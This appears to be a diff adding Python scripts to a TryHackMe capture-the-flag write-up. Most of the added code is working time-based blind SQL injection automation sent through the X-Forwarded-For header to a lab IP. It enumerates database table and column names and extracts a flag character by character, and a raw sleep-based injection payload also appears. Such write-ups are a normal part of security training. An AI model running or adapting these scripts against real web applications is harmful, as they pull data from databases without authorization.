@@ -237,8 +237,253 @@ Flag found:  THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
 X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,2,1))) = '72'); --+
 ```
 
+```
+message = ""
 
+  
 
+with open("data.txt") as f:
+
+    for line in f:
+
+        parts = line.strip().split('\t')
+
+        if len(parts) > 4 and parts[4].isdigit() and int(parts[4]) > 5000:
+
+            ascii_val = int(parts[2])
+
+            message += chr(ascii_val)
+
+            # print(chr(ascii_val))
+
+            # print("flag:   ", message)
+
+  
+
+print("Decoded message:", message)
+```
+
+```
+import requests
+
+import time
+
+import string
+
+  
+
+server = "10.10.239.142"  # IP or server name
+
+  
+
+# Function to send the request and check the result
+
+def get_result(payload, sleep_time=3, retries=3):
+
+    url = f"http://{server}"
+
+    headers = {'X-Forwarded-For': payload}
+
+    success_count = 0
+
+    for _ in range(retries):
+
+        try:
+
+            start = time.time()
+
+            response = requests.get(url, headers=headers, timeout=sleep_time + 3)
+
+            end = time.time()
+
+            if end - start >= sleep_time - 0.5:  # Slight flexibility for network delay
+
+                success_count += 1
+
+        except requests.exceptions.RequestException:
+
+            pass
+
+  
+
+    # Majority voting - return True if at least half the attempts succeed
+
+    return success_count >= (retries // 2 + 1)
+
+  
+  
+
+## 1. Find Table Names of CurrentDB
+
+table_names = []
+
+for table_index in range(0, 10):
+
+    table_name = ""
+
+    i = 1
+
+    while True:
+
+        found = False
+
+        for char in string.printable:
+
+            if char in ("'", '\\'):  # Skip problematic characters
+
+                continue
+
+            payload = f"1' AND (SELECT sleep(3) FROM (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT {table_index},1) AS tbl WHERE ASCII(SUBSTR(tbl.table_name,{i},1))={ord(char)}); --++"
+
+            if get_result(payload):
+
+                table_name += char
+
+                print(f"Finding Table[{table_index}]: {table_name}", end="\r")
+
+                i += 1
+
+                found = True
+
+                break
+
+        if not found:
+
+            break
+
+    if table_name:
+
+        table_names.append(table_name)
+
+    else:
+
+        break
+
+print(f"\nTables: {table_names}")
+
+  
+  
+
+# 2. Find Column Names for Each Table
+
+columns = {}
+
+for table in table_names:
+
+    columns[table] = []
+
+    for col_index in range(0, 10):
+
+        column_name = ""
+
+        i = 1
+
+        while True:
+
+            found = False
+
+            for char in string.printable:
+
+                if char in ("'", '\\'):  # Skip problematic characters
+
+                    continue
+
+                payload = f"1' AND (SELECT sleep(3) FROM (SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {col_index},1) AS col WHERE ASCII(SUBSTR(col.column_name,{i},1))={ord(char)}); --+"
+
+                if get_result(payload):
+
+                    column_name += char
+
+                    print(f"Finding Column[{col_index}] in Table[{table}]: {column_name}", end="\r")
+
+                    i += 1
+
+                    found = True
+
+                    break
+
+            if not found:
+
+                break
+
+        if column_name:
+
+            columns[table].append(column_name)
+
+        else:
+
+            break
+
+print(f"\nColumns: {columns}")
+```
+
+```
+import requests
+
+import time
+
+import string
+
+  
+
+server = "10.10.239.142"  # IP or server name
+
+flag = ""
+
+loop = 1
+
+url = f"http://{server}"
+
+  
+
+# Function to send the request and check the result
+
+def get_result(payload):
+
+    headers = {'X-Forwarded-For': payload}
+
+    try:
+
+        start = time.time()
+
+        response = requests.get(url, headers=headers, timeout=5)
+
+        end = time.time()
+
+        return end - start >= 2  # Return whether the response took longer than 2 seconds
+
+    except requests.exceptions.RequestException:
+
+        return False  # If request fails, return False
+
+  
+
+# Main loop to extract the flag
+
+while chr(125) not in flag:
+
+    for char in string.printable:
+
+        if char in ("'", '\\'):  # Skip problematic characters
+
+            continue
+
+        payload = f"1' AND (SELECT sleep(5) FROM flag WHERE ASCII(SUBSTR(flag,{loop},1)) = {ord(char)}); --+"
+
+        if get_result(payload):
+
+            flag += char
+
+            loop += 1
+
+            print(f"Finding Flag: {flag}", end="\r")
+
+            break
+
+  
+
+print(f"\nFlag found: {flag}")
+```
 ---
 
 
